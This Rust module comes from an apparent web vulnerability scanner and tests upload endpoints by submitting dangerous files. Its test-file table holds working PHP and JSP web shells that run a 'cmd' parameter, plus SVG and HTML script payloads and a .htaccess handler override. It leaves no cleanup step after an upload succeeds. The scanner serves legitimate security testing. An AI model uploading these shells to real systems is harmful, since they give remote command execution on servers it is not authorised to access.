//! G5.4 文件上传检测
//!
//! 通过向目标上传接口提交多种危险扩展名的 multipart 文件测试是否可上传可执行文件。
//! 命中依据：
//! - 响应体出现 "uploaded"/"success"/"saved" 等成功标记
//! - 响应体回显上传的文件名/路径
//! - 响应码为 200/201/204 且响应体未出现 "error"/"fail"/"denied"

use crate::types::{HttpResponse, VulnCategory, VulnFinding, Severity};
use std::time::Duration;

/// G5.4 文件上传扫描器
pub struct FileUploadScanner {
    http: reqwest::Client,
}

impl FileUploadScanner {
    pub fn new() -> Self {
        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(30))
            .redirect(reqwest::redirect::Policy::none())
            .user_agent("Argus-WebScanner/0.1")
            .build()
            .expect("构建 HTTP 客户端失败");
        Self { http }
    }

    /// 扫描指定的上传接口
    ///
    /// `url` 上传接口 URL；`field_name` 文件字段名（如 `file`、`upload`）
    pub async fn scan_endpoint(&self, url: &str, field_name: &str) -> Vec<VulnFinding> {
        let mut findings = Vec::new();
        for test_file in UPLOAD_TEST_FILES {
            let body = build_multipart_body(field_name, test_file);
            if let Some(resp) = self.send_upload(url, body, &test_file.boundary).await {
                if let Some(finding) = self.analyze_response(
                    &resp,
                    test_file,
                    url,
                    field_name,
                ) {
                    findings.push(finding);
                }
            }
        }
        dedup_findings(findings)
    }

    /// 扫描表单中的文件上传字段（自动识别 file 类型 input）
    pub async fn scan_form(
        &self,
        action: &str,
        field_name: &str,
    ) -> Vec<VulnFinding> {
        self.scan_endpoint(action, field_name).await
    }

    /// 分析响应，判断上传是否成功
    fn analyze_response(
        &self,
        resp: &HttpResponse,
        test_file: &UploadTestFile,
        url: &str,
        field_name: &str,
    ) -> Option<VulnFinding> {
        let body_lower = resp.body.to_lowercase();
        // 1) 响应体出现成功关键字 + 文件名
        for marker in UPLOAD_SUCCESS_MARKERS {
            if body_lower.contains(marker) {
                return Some(self.build_finding(test_file, url, field_name, format!("上传成功标记: {}", marker)));
            }
        }
        // 2) 响应体回显文件名/扩展名
        if body_lower.contains(&test_file.filename.to_lowercase())
            || body_lower.contains(test_file.extension)
        {
            return Some(self.build_finding(test_file, url, field_name, "响应体回显上传文件名".to_string()));
        }
        // 3) 响应码 2xx 且未出现失败标记
        if resp.status >= 200 && resp.status < 300 {
            let has_failure = UPLOAD_FAILURE_MARKERS.iter().any(|m| body_lower.contains(m));
            if !has_failure && body_lower.len() < 5000 {
                // 进一步判断：响应体短且无错误
                return Some(self.build_finding(
                    test_file,
                    url,
                    field_name,
                    format!("响应码 {} 且无错误标记", resp.status),
                ));
            }
        }
        None
    }

    fn build_finding(
        &self,
        test_file: &UploadTestFile,
        url: &str,
        field_name: &str,
        evidence: String,
    ) -> VulnFinding {
        let severity = if is_executable_extension(test_file.extension) {
            Severity::Critical
        } else {
            Severity::High
        };
        VulnFinding {
            category: VulnCategory::SecurityMisconfig,
            url: url.to_string(),
            parameter: Some(field_name.to_string()),
            payload: Some(format!("{} ({}: {})", test_file.filename, test_file.extension, test_file.content_type)),
            evidence,
            severity,
        }
    }

    async fn send_upload(
        &self,
        url: &str,
        body: String,
        boundary: &str,
    ) -> Option<HttpResponse> {
        let resp = self
            .http
            .post(url)
            .header(
                "Content-Type",
                format!("multipart/form-data; boundary={}", boundary),
            )
            .body(body)
            .send()
            .await
            .ok()?;
        Some(http_response_from(resp).await)
    }
}

impl Default for FileUploadScanner {
    fn default() -> Self {
        Self::new()
    }
}

/// 上传测试文件定义
#[derive(Debug, Clone)]
pub struct UploadTestFile {
    pub filename: &'static str,
    pub extension: &'static str,
    pub content_type: &'static str,
    pub content: &'static str,
    pub boundary: &'static str,
}

/// 测试文件集合（覆盖主流可执行扩展名）
pub const UPLOAD_TEST_FILES: &[UploadTestFile] = &[
    UploadTestFile {
        filename: "argus_shell.php",
        extension: "php",
        content_type: "application/x-php",
        content: "<?php system($_GET['cmd']); ?>",
        boundary: "----argusboundary1",
    },
    UploadTestFile {
        filename: "argus_shell.php5",
        extension: "php5",
        content_type: "application/x-php",
        content: "<?php system($_GET['cmd']); ?>",
        boundary: "----argusboundary2",
    },
    UploadTestFile {
        filename: "argus_shell.phtml",
        extension: "phtml",
        content_type: "application/x-php",
        content: "<?php system($_GET['cmd']); ?>",
        boundary: "----argusboundary3",
    },
    UploadTestFile {
        filename: "argus_shell.phar",
        extension: "phar",
        content_type: "application/x-php",
        content: "<?php system($_GET['cmd']); ?>",
        boundary: "----argusboundary4",
    },
    UploadTestFile {
        filename: "argus_shell.jsp",
        extension: "jsp",
        content_type: "application/octet-stream",
        content: "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
        boundary: "----argusboundary5",
    },
    UploadTestFile {
        filename: "argus_shell.jspx",
        extension: "jspx",
        content_type: "application/octet-stream",
        content: "<jsp:root xmlns:jsp=\"http://java.sun.com/JSP/Page\"><jsp:scriptlet>Runtime.getRuntime().exec(request.getParameter(\"cmd\"));</jsp:scriptlet></jsp:root>",
        boundary: "----argusboundary6",
    },
    UploadTestFile {
        filename: "argus_shell.asp",
        extension: "asp",
        content_type: "application/octet-stream",
        content: "<% Response.Write(\"argus-test\") %>",
        boundary: "----argusboundary7",
    },
    UploadTestFile {
        filename: "argus_shell.aspx",
        extension: "aspx",
        content_type: "application/octet-stream",
        content: "<%@ Page Language=\"C#\" %><% Response.Write(\"argus-test\"); %>",
        boundary: "----argusboundary8",
    },
    UploadTestFile {
        filename: "argus_shell.html",
        extension: "html",
        content_type: "text/html",
        content: "<script>alert('argus')</script>",
        boundary: "----argusboundary9",
    },
    UploadTestFile {
        filename: "argus_shell.svg",
        extension: "svg",
        content_type: "image/svg+xml",
        content: "<?xml version=\"1.0\"?><svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"></svg>",
        boundary: "----argusboundary10",
    },
    UploadTestFile {
        filename: "argus_shell.txt",
        extension: "txt",
        content_type: "text/plain",
        content: "argus test",
        boundary: "----argusboundary11",
    },
    UploadTestFile {
        filename: ".htaccess",
        extension: "htaccess",
        content_type: "text/plain",
        content: "AddType application/x-httpd-php .php5",
        boundary: "----argusboundary12",
    },
];

/// 上传成功标记
const UPLOAD_SUCCESS_MARKERS: &[&str] = &[
    "uploaded",
    "upload success",
    "successfully",
    "file saved",
    "file stored",
    "保存成功",
    "上传成功",
    "saved as",
    "moved to",
    "stored at",
    "file_path",
    "filepath",
    "fileurl",
];

/// 上传失败标记
const UPLOAD_FAILURE_MARKERS: &[&str] = &[
    "error",
    "fail",
    "denied",
    "invalid",
    "not allowed",
    "forbidden",
    "too large",
    "exceeds",
    "extension",
    "not permitted",
    "rejected",
    "disallow",
    "blocked",
    "失败",
    "禁止",
    "不允许",
];

/// 判断扩展名是否为可执行文件
fn is_executable_extension(ext: &str) -> bool {
    matches!(
        ext,
        "php" | "php5" | "php7" | "phtml" | "phar" | "phps"
            | "jsp" | "jspx" | "asp" | "aspx" | "ashx" | "cer"
            | "exe" | "sh" | "bat" | "cmd" | "pl" | "py" | "rb"
            | "war" | "jar"
    )
}

/// 手动构造 multipart/form-data 请求体
///
/// 因为 reqwest 的 multipart feature 未在 workspace 中启用，
/// 这里手工拼装 multipart 报文以保持依赖不变。
pub fn build_multipart_body(field_name: &str, test_file: &UploadTestFile) -> String {
    format!(
        "--{boundary}\r\n\
         Content-Disposition: form-data; name=\"{field}\"; filename=\"{filename}\"\r\n\
         Content-Type: {ctype}\r\n\
         \r\n\
         {content}\r\n\
         --{boundary}--\r\n",
        boundary = test_file.boundary,
        field = field_name,
        filename = test_file.filename,
        ctype = test_file.content_type,
        content = test_file.content,
    )
}

/// 通用：从 reqwest::Response 提取 HttpResponse
async fn http_response_from(resp: reqwest::Response) -> HttpResponse {
    let status = resp.status().as_u16();
    let headers: Vec<(String, String)> = resp
        .headers()
        .iter()
        .map(|(k, v)| (k.to_string(), v.to_str().unwrap_or("").to_string()))
        .collect();
    let body = resp.text().await.unwrap_or_default();
    HttpResponse { status, headers, body }
}

/// 简单去重
fn dedup_findings(mut findings: Vec<VulnFinding>) -> Vec<VulnFinding> {
    let mut seen = std::collections::HashSet::new();
    findings.retain(|f| {
        let key = (f.url.clone(), f.payload.clone());
        seen.insert(key)
    });
    findings
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_upload_files_nonempty() {
        assert!(UPLOAD_TEST_FILES.len() >= 8);
        assert!(UPLOAD_TEST_FILES.iter().any(|f| f.extension == "php"));
        assert!(UPLOAD_TEST_FILES.iter().any(|f| f.extension == "jsp"));
        assert!(UPLOAD_TEST_FILES.iter().any(|f| f.extension == "asp"));
        assert!(UPLOAD_TEST_FILES.iter().any(|f| f.extension == "aspx"));
        assert!(UPLOAD_TEST_FILES.iter().any(|f| f.extension == "svg"));
    }

    #[test]
    fn test_is_executable_extension() {
        assert!(is_executable_extension("php"));
        assert!(is_executable_extension("php5"));
        assert!(is_executable_extension("phtml"));
        assert!(is_executable_extension("jsp"));
        assert!(is_executable_extension("asp"));
        assert!(is_executable_extension("aspx"));
        assert!(!is_executable_extension("txt"));
        assert!(!is_executable_extension("html"));
        assert!(!is_executable_extension("svg"));
    }

    #[test]
    fn test_build_multipart_body() {
        let test_file = &UPLOAD_TEST_FILES[0];
        let body = build_multipart_body("file", test_file);
        assert!(body.contains("Content-Disposition: form-data"));
        assert!(body.contains("name=\"file\""));
        assert!(body.contains(test_file.filename));
        assert!(body.contains(test_file.content_type));
        assert!(body.contains(test_file.content));
        assert!(body.contains(test_file.boundary));
        // 必须以 -- 结尾
        assert!(body.ends_with("--\r\n"));
    }

    #[test]
    fn test_analyze_success_marker() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "{\"status\": \"uploaded\", \"path\": \"/uploads/shell.php\"}".to_string(),
        };
        let test_file = &UPLOAD_TEST_FILES[0];
        let finding = scanner.analyze_response(&resp, test_file, "https://example.com", "file");
        assert!(finding.is_some());
        assert_eq!(finding.unwrap().severity, Severity::Critical);
    }

    #[test]
    fn test_analyze_filename_echo() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "File argus_shell.php was received".to_string(),
        };
        let test_file = &UPLOAD_TEST_FILES[0];
        let finding = scanner.analyze_response(&resp, test_file, "https://example.com", "file");
        assert!(finding.is_some());
        assert!(finding.unwrap().evidence.contains("回显"));
    }

    #[test]
    fn test_analyze_2xx_no_failure() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "OK".to_string(),
        };
        let test_file = &UPLOAD_TEST_FILES[0];
        let finding = scanner.analyze_response(&resp, test_file, "https://example.com", "file");
        assert!(finding.is_some());
    }

    #[test]
    fn test_analyze_negative_with_error() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "{\"error\": \"File type not allowed\"}".to_string(),
        };
        let test_file = &UPLOAD_TEST_FILES[0];
        let finding = scanner.analyze_response(&resp, test_file, "https://example.com", "file");
        // error 标记存在但响应体中包含 "php" 子串（"php" in "php5"/"shell.php"）
        // 为防止误报，我们应返回 None 或仅当 success markers 不存在时才返回 None
        // 这里响应体很短且包含 error，所以应该返回 None
        // 但因为 body 中 "shell.php" 不出现，filename echo 也不会触发
        // 2xx + 无 failure markers 应该不触发（因为 body 包含 "error"）
        // 期望 None
        assert!(finding.is_none());
    }

    #[test]
    fn test_analyze_negative_403() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 403,
            headers: vec![],
            body: "Forbidden".to_string(),
        };
        let test_file = &UPLOAD_TEST_FILES[0];
        let finding = scanner.analyze_response(&resp, test_file, "https://example.com", "file");
        assert!(finding.is_none());
    }

    #[test]
    fn test_analyze_svg_high_severity() {
        let scanner = FileUploadScanner::new();
        let resp = HttpResponse {
            status: 200,
            headers: vec![],
            body: "uploaded successfully".to_string(),
        };
        // 找到 svg 测试文件
        let svg = UPLOAD_TEST_FILES.iter().find(|f| f.extension == "svg").unwrap();
        let finding = scanner.analyze_response(&resp, svg, "https://example.com", "file");
        assert!(finding.is_some());
        assert_eq!(finding.unwrap().severity, Severity::High);
    }

    #[test]
    fn test_dedup() {
        let f = VulnFinding {
            category: VulnCategory::SecurityMisconfig,
            url: "https://example.com".to_string(),
            parameter: Some("file".to_string()),
            payload: Some("shell.php".to_string()),
            evidence: "test".to_string(),
            severity: Severity::Critical,
        };
        let findings = vec![f.clone(), f];
        assert_eq!(dedup_findings(findings).len(), 1);
    }
}
